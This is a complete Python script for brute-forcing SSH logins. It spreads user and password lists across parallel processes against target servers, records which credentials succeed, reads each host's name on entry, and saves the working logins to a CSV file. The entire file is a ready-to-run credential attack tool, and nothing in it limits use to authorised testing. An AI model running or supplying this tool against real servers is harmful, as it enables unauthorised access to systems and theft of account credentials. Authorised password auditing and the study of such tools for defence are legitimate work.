#! /usr/bin/env python3

import paramiko
from datetime import date
from optparse import OptionParser
from colorama import Fore, Back, Style
from multiprocessing import Lock, Pool, cpu_count
from time import strftime, localtime, time

status_color = {
    '+': Fore.GREEN,
    '-': Fore.RED,
    '*': Fore.YELLOW,
    ':': Fore.CYAN,
    ' ': Fore.WHITE
}

def display(status, data, start='', end='\n'):
    print(f"{start}{status_color[status]}[{status}] {Fore.BLUE}[{date.today()} {strftime('%H:%M:%S', localtime())}] {status_color[status]}{Style.BRIGHT}{data}{Fore.RESET}{Style.RESET_ALL}", end=end)

def get_arguments(*args):
    parser = OptionParser()
    for arg in args:
        parser.add_option(arg[0], arg[1], dest=arg[2], help=arg[3])
    return parser.parse_args()[0]

port = 22
ignore_errors = True
lock = Lock()

def login(ssh_server, port, user, password):
    t1 = time()
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ssh_server, port=port, username=user, password=password, allow_agent=False)
        try:
            stdin, stdout, stderr = ssh.exec_command("echo $HOSTNAME")
            hostname = stdout.readlines()[0].replace('\n', '')
        except:
            hostname = ''
        ssh.close()
        t2 = time()
        return True, hostname, t2-t1
    except paramiko.ssh_exception.AuthenticationException:
        t2 = time()
        return False, '', t2-t1
    except Exception as err:
        t2 = time()
        return err, '', t2-t1
def brute_force(process_index, ssh_servers, port, credentials):
    successful_logins = {}
    for credential in credentials:
        for ssh_server in ssh_servers:
            status = ['']
            while status[0] != True and status[0] != False:
                status = login(ssh_server, port, credential[0], credential[1])
                if status[0] == True:
                    successful_logins[credential[0]] = credential[1]
                    with lock:
                        display(' ', f"Process {process_index+1}:{status[2]:.2f}s -> {Fore.CYAN}{credential[0]}{Fore.RESET}:{Fore.GREEN}{credential[1]}{Fore.RESET} => {Back.MAGENTA}{Fore.BLUE}Authorized{Fore.RESET}{Back.RESET} ({Back.CYAN}{status[1]}{Back.RESET})")
                elif status[0] == False:
                    with lock:
                        display(' ', f"Process {process_index+1}:{status[2]:.2f}s -> {Fore.CYAN}{credential[0]}{Fore.RESET}:{Fore.GREEN}{credential[1]}{Fore.RESET} => {Back.RED}{Fore.YELLOW}Access Denied{Fore.RESET}{Back.RESET}")
                else:
                    with lock:
                        display(' ', f"Process {process_index+1}:{status[2]:.2f}s -> {Fore.CYAN}{credential[0]}{Fore.RESET}:{Fore.GREEN}{credential[1]}{Fore.RESET} => {Fore.YELLOW}Error Occured : {Back.RED}{status[0]}{Fore.RESET}{Back.RESET}")
                    if ignore_errors:
                        break
    return successful_logins
def main(servers, port, credentials):
    successful_logins = {}
    process_count = cpu_count()
    pool = Pool(process_count)
    display('+', f"Starting {Back.MAGENTA}{process_count} Brute Force Processes{Back.RESET}")
    display(':', f"Credentials / Processes = {Back.MAGENTA}{len(credentials)//process_count}{Back.RESET}")
    processes = []
    total_servers = len(servers)
    server_divisions = [servers[group*total_servers//process_count: (group+1)*total_servers//process_count] for group in range(process_count)]
    for index, server_division in enumerate(server_divisions):
        processes.append(pool.apply_async(brute_force, (index, server_division, port, credentials, )))
    for process in processes:
        successful_logins.update(process.get())
    pool.close()
    pool.join()
    display('+', f"Processes Finished Excuting")
    return successful_logins

if __name__ == "__main__":
    arguments = get_arguments(('-s', "--server", "server", "Target SSH Servers (seperated by ',' or File Name)"),
                              ('-p', "--port", "port", f"Port of Target SSH Server (Default={port})"),
                              ('-u', "--users", "users", "Target Users (seperated by ',') or File containing List of Users"),
                              ('-P', "--password", "password", "Passwords (seperated by ',') or File containing List of Passwords"),
                              ('-c', "--credentials", "credentials", "Name of File containing Credentials in format ({user}:{password})"),
                              ('-i', "--ignore-errors", "ignore_errors", f"Ignore Errors (True/False, Default={ignore_errors})"),
                              ('-w', "--write", "write", "CSV File to Dump Successful Logins (default=current data and time)"))
    if not arguments.server:
        display('-', f"Please specify {Back.YELLOW}Target Server{Back.RESET}")
        exit(0)
    else:
        try:
            with open(arguments.server, 'r') as file:
                arguments.server = [server for server in file.read().split('\n') if server != '']
        except FileNotFoundError:
            arguments.server = arguments.server.split(',')
        except Exception as error:
            display('-', f"Error Occured while reading File {Back.MAGENTA}{arguments.server}{Back.RESET} => {Back.YELLOW}{error}{Back.RESET}")
            exit(0)
    if not arguments.port:
        arguments.port = port
    else:
        arguments.port = int(arguments.port)
    if not arguments.credentials:
        if not arguments.users:
            display('-', f"Please specify {Back.YELLOW}Target Users{Back.RESET}")
            exit(0)
        else:
            try:
                with open(arguments.users, 'r') as file:
                    arguments.users = [user for user in file.read().split('\n') if user != '']
            except FileNotFoundError:
                arguments.users = arguments.users.split(',')
            except:
                display('-', f"Error while Reading File {Back.YELLOW}{arguments.users}{Back.RESET}")
                exit(0)
            display(':', f"Users Loaded = {Back.MAGENTA}{len(arguments.users)}{Back.RESET}")
        if not arguments.password:
            display('-', f"Please specify {Back.YELLOW}Passwords{Back.RESET}")
            exit(0)
        else:
            try:
                with open(arguments.password, 'r') as file:
                    arguments.password = [password for password in file.read().split('\n') if password != '']
            except FileNotFoundError:
                arguments.password = arguments.password.split(',')
            except:
                display('-', f"Error while Reading File {Back.YELLOW}{arguments.password}{Back.RESET}")
                exit(0)
            display(':', f"Passwords Loaded = {Back.MAGENTA}{len(arguments.password)}{Back.RESET}")
        arguments.credentials = []
        for user in arguments.users:
            for password in arguments.password:
                arguments.credentials.append([user, password])
    else:
        try:
            with open(arguments.credentials, 'r') as file:
                arguments.credentials = [[credential.split(':')[0], ':'.join(credential.split(':')[1:])] for credential in file.read().split('\n') if len(credential.split(':')) > 1]
        except:
            display('-', f"Error while Reading File {Back.YELLOW}{arguments.credentials}{Back.RESET}")
            exit(0)
    if arguments.ignore_errors == False:
        ignore_errors = False
    if not arguments.write:
        arguments.write = f"{date.today()} {strftime('%H_%M_%S', localtime())}.csv"
    display('+', f"Total Credentials = {Back.MAGENTA}{len(arguments.credentials)}{Back.RESET}")
    t1 = time()
    successful_logins = main(arguments.server, arguments.port, arguments.credentials)
    t2 = time()
    display(':', f"Successful Logins = {Back.MAGENTA}{len(successful_logins)}{Back.RESET}")
    display(':', f"Total Credentials = {Back.MAGENTA}{len(arguments.credentials)}{Back.RESET}")
    display(':', f"Time Taken        = {Back.MAGENTA}{t2-t1:.2f} seconds{Back.RESET}")
    display(':', f"Rate              = {Back.MAGENTA}{len(arguments.credentials)/(t2-t1):.2f} logins / seconds{Back.RESET}")
    display(':', f"Dumping Successful Logins to File {Back.MAGENTA}{arguments.write}{Back.RESET}")
    with open(arguments.write, 'w') as file:
        file.write(f"User,Password\n")
        file.write('\n'.join([f"{user},{password}" for user, password in successful_logins.items()]))
    display('+', f"Dumped Successful Logins to File {Back.MAGENTA}{arguments.write}{Back.RESET}")